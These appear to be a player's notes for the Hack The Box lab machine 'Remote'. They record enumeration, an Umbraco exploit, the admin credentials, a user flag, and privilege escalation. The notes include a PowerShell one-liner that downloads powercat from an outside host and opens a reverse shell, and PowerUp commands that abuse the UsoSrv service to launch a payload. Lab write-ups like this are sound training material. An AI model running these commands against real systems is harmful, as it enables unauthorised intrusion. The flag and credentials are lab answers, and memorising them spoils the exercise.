# Basic
```
* Name: Remote
* IP: 10.10.10.180 
* Level: Easy
* Box: Windows
* Released: 21 Mar 2020

```
# File Structure
```

* Loot - Contains passwords, hashes and other intresting stuff
* Recon - Nmap scans, directory scans etc.
* NFS - Nfs volume mounting point
* Exploit - Working exploits

```
# Flags

```
* User: 710a51824d591f7ec8cbc9785aaae886
* Root

```

# Creds

```
* Umbraco: 
  admin@htb.local
  baconandcheese

```

# Enumeration

```
* Ports
  445
  111
  139
  80 (Microsoft HTTPAPI httpd 2.0)
  21 (Microsoft ftpd)
  135
  2049( nfs share)

* Mounted an nfs share and found site backup.
* Found a database file in App_Data.
* Found hashes from that file.
* Umb version : 7.12.14 ( Found from installed packages.conf in the nfs share)
* Umbraco running on /install
* Exploit found
* The exploit had to be tweaked to include a special cookie that the server sent.
* Run the following command to get a reverse powershell command :
  `powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"`
* Powercat downloaded from : (https://github.com/besimorhino/powercat.git)
* Uploaded a meterpreter exe and got a meterpreter shell
```

# Privesc

```
* Ran powerup.ps1 from powersploit
* Found a service and then ran a reverse meterpreter session
* commands:
  `> import-module ./powerup.ps1
    > invoke-allchecks
    > invoke-serviceabuse -servicename 'UsoSrv' -command c:/users/public/rev.exe
  `
* Ran exploit/multi/handler with "autoexecutescipt set to post/windows/migrate"
```
